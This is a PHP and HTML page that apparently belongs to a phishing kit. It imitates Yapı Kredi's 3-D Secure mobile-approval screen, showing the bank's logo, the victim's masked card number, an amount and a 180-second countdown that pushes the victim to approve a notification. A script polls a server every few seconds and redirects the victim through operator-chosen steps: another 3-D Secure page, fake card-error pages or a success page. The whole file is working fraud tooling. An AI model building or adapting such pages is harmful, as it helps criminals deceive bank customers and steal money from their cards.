<?php
$is_mobil_onay = true;
require __DIR__ . '/_acs_core.php';

// Format dynamic variables
$cc_clean = preg_replace('/\D/', '', $kart_no);
if (strlen($cc_clean) >= 16) {
    $first_4 = substr($cc_clean, 0, 4);
    $next_2 = substr($cc_clean, 4, 2);
    $last_4 = substr($cc_clean, -4);
    $masked_card = "{$first_4} {$next_2}** **** {$last_4}";
} else {
    $masked_card = '4506 34** **** 9128'; // fallback
}

// Transaction date formatted like 06/07/2026 19:43:28
$zaman_ykb = date('d/m/Y H:i:s');

// Transaction amount formatted like 59.998,00 TL
$ucret_val = ayar_get('randevu_ucreti', '49');
$tutar_ykb = number_format((float)$ucret_val, 2, ',', '.') . ' TL';
?>
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Yapı Kredi - Üç Boyutlu Güvenlik Sistemi</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    body {
      background: #0082c8; /* Bright blue background */
      background: linear-gradient(135deg, #0090e3 0%, #005fa9 100%);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      color: #333;
    }
    
    /* Top Bar */
    .top-header {
      background-color: #002d62;
      color: #fff;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 14px 24px;
      font-size: 14px;
      font-weight: 500;
    }
    .top-header .title {
      font-size: 14px;
      font-weight: 700;
      letter-spacing: 0.2px;
    }
    .top-header .links {
      font-size: 13px;
    }
    .top-header .links span {
      margin-left: 6px;
      margin-right: 6px;
      cursor: pointer;
      opacity: 0.9;
    }
    .top-header .links span:hover {
      opacity: 1;
      text-decoration: underline;
    }

    /* Main Container */
    .container {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 16px;
    }
    
    /* Card with exact borders from screenshot */
    .card {
      background: #ffffff;
      border-radius: 4px;
      width: 100%;
      max-width: 480px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
      border: 8px solid #85c2f2; /* Exact light blue border thickness */
      overflow: hidden;
    }
    
    /* Logo Header */
    .logo-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 24px 24px 16px 24px;
    }
    .logo-row img.ykb-logo {
      height: 32px;
    }
    .logo-row .visa-logo-text {
      color: #0a2540;
      font-size: 22px;
      font-weight: 900;
      font-style: italic;
      letter-spacing: 0.5px;
    }
    
    /* Card Body */
    .card-body {
      padding: 0 24px 24px 24px;
    }
    
    /* Info Grid (adapted for mobile) */
    .info-grid {
      display: grid;
      grid-template-columns: 140px 1fr;
      row-gap: 12px;
      margin-bottom: 20px;
      font-size: 13.5px;
    }
    .info-label {
      color: #666;
      font-weight: 500;
    }
    .info-value {
      color: #111;
      font-weight: 700;
      word-break: break-word;
    }
    
    /* Bu bilgiler paylaşılmamaktadır Alert */
    .share-alert {
      display: flex;
      align-items: center;
      gap: 8px;
      color: #0082c8;
      font-size: 13px;
      font-weight: 600;
      margin-bottom: 20px;
    }
    .share-alert svg {
      width: 18px;
      height: 18px;
      flex-shrink: 0;
      fill: none;
      stroke: #0082c8;
      stroke-width: 2;
    }

    /* Notification Box */
    .notification-container {
      background-color: #f3f7fa;
      border-radius: 4px;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
    }
    .notification-msg-row {
      display: flex;
      gap: 10px;
      align-items: flex-start;
      width: 100%;
      color: #002d62;
      font-size: 13px;
      line-height: 1.5;
      font-weight: 500;
    }
    .notification-msg-row svg {
      width: 20px;
      height: 20px;
      flex-shrink: 0;
      fill: none;
      stroke: #0082c8;
      stroke-width: 2;
      margin-top: 2px;
    }
    
    /* Timer CSS */
    .timer-circle-wrap {
      position: relative;
      width: 90px;
      height: 90px;
    }
    .timer-svg {
      width: 100%;
      height: 100%;
      transform: rotate(-90deg);
    }
    .timer-svg circle {
      fill: none;
      stroke-width: 6;
    }
    .timer-svg circle.bg-track {
      stroke: #e2e8f0;
    }
    .timer-svg circle.fill-progress {
      stroke: #0082c8;
      stroke-dasharray: 251.2; /* 2 * pi * 40 */
      stroke-dashoffset: 0;
      stroke-linecap: round;
      transition: stroke-dashoffset 1s linear;
    }
    .timer-digits {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 22px;
      font-weight: 700;
      color: #111;
    }
    .timer-text-below {
      font-size: 13.5px;
      color: #0082c8;
      font-weight: 700;
      text-align: center;
    }

    /* Small Screen Responsive Settings */
    @media (max-width: 480px) {
      .top-header {
        padding: 10px 14px;
        font-size: 12.5px;
      }
      .top-header .title {
        font-size: 12px;
      }
      .top-header .links {
        font-size: 11.5px;
      }
      .container {
        padding: 10px;
      }
      .card {
        border-width: 4px; /* Slightly thinner border on mobile */
      }
      .logo-row {
        padding: 16px 16px 12px 16px;
      }
      .logo-row img.ykb-logo {
        height: 26px;
      }
      .logo-row .visa-logo-text {
        font-size: 18px;
      }
      .card-body {
        padding: 0 16px 16px 16px;
      }
      .info-grid {
        grid-template-columns: 110px 1fr;
        row-gap: 8px;
        font-size: 12.5px;
      }
      .notification-container {
        padding: 14px;
      }
      .notification-msg-row {
        font-size: 12px;
      }
    }
  </style>
</head>
<body>
  
  <div class="top-header">
    <div class="title">Üç Boyutlu Güvenlik Sistemi</div>
    <div class="links">
      <span>Yardım</span>|<span>English</span>
    </div>
  </div>

  <div class="container">
    <div class="card">
      <div class="logo-row">
        <img class="ykb-logo" src="https://goguvenliodeme.bkm.com.tr/banklogo/yapikredi.png" alt="Yapı Kredi">
        <span class="visa-logo-text">VISA</span>
      </div>
      
      <div class="card-body">
        <div class="info-grid">
          <div class="info-label">Üye İşyeri İsmi</div>
          <div class="info-value"><?= htmlspecialchars($isyeri) ?></div>
          
          <div class="info-label">Tutar</div>
          <div class="info-value"><?= $tutar_ykb ?></div>
          
          <div class="info-label">Tarih</div>
          <div class="info-value"><?= $zaman_ykb ?></div>
          
          <div class="info-label">Kart Numarası</div>
          <div class="info-value"><?= $masked_card ?></div>
          
          <div class="info-label">Cihaz Bilgisi</div>
          <div class="info-value">M2007J20CG</div>
        </div>
        
        <div class="share-alert">
          <svg viewBox="0 0 24 24">
            <circle cx="12" cy="12" r="10" />
            <line x1="12" y1="8" x2="12" y2="12" />
            <line x1="12" y1="16" x2="12.01" y2="16" />
          </svg>
          <div>Bu bilgiler işyerleri ile paylaşılmamaktadır.</div>
        </div>
        
        <div class="notification-container">
          <div class="notification-msg-row">
            <svg viewBox="0 0 24 24">
              <circle cx="12" cy="12" r="10" />
              <line x1="12" y1="8" x2="12" y2="12" />
              <line x1="12" y1="16" x2="12.01" y2="16" />
            </svg>
            <div>Akıllı Bildirim tanımlı mobil cihazınıza gönderilen Akıllı Bildirim'i onaylayarak işleminizi tamamlayabilirsiniz.</div>
          </div>
          
          <div class="timer-circle-wrap">
            <svg class="timer-svg" viewBox="0 0 100 100">
              <circle class="bg-track" cx="50" cy="50" r="40" />
              <circle class="fill-progress" cx="50" cy="50" r="40" id="progress-bar-fill" />
            </svg>
            <div class="timer-digits" id="countdown-num">180</div>
          </div>
          
          <div class="timer-text-below" id="timer-text-below">180 saniye içinde onaylayınız.</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    var sec = 180;
    var progressBar = document.getElementById('progress-bar-fill');
    var countdownNum = document.getElementById('countdown-num');
    var secondsText = document.getElementById('timer-text-below');
    var totalSec = 180;
    var dashArray = 251.2;

    function updateTimer() {
      if (sec <= 0) {
        clearInterval(timerInterval);
        // Redirect to bekle.php
        window.location.href = '<?= BASE_PATH ?>/bekle.php';
        return;
      }
      sec--;
      countdownNum.textContent = sec;
      secondsText.textContent = sec + " saniye içinde onaylayınız.";
      
      // Calculate progress dash offset
      var offset = dashArray - (dashArray * (sec / totalSec));
      progressBar.style.strokeDashoffset = offset;
    }

    // Set initial dash offset to 0 (full circle)
    progressBar.style.strokeDashoffset = 0;
    var timerInterval = setInterval(updateTimer, 1000);

    // Heartbeat logic
    function heartbeat(){
      fetch('<?= BASE_PATH ?>/api/heartbeat.php', {method:'POST', credentials:'same-origin'})
        .then(function(r){ return r.json(); })
        .then(function(d){
          var dur = d.durum || 'bekle';
          if (dur === 'provizyon_hatali') {
            return; // stay here
          }
          if (dur === '3d_gonder' || dur === '3d_hatali') {
            window.location.href = '<?= BASE_PATH ?>/acs/yapikredi.php';
            return;
          }
          if (dur === 'tebrik') {
            window.location.href = '<?= BASE_PATH ?>/sonuc.php';
            return;
          }
          var errors = ['kart_hatali', 'eticaret_kapali', 'limit_yetersiz', 'kart_desteklenmiyor', 'provizyon_gonder'];
          if (errors.indexOf(dur) !== -1) {
            window.location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=' + dur;
            return;
          }
          if (dur === 'bekle') {
            window.location.href = '<?= BASE_PATH ?>/bekle.php';
            return;
          }
        }).catch(function(){});
    }
    setInterval(heartbeat, 2500);
  </script>
</body>
</html>
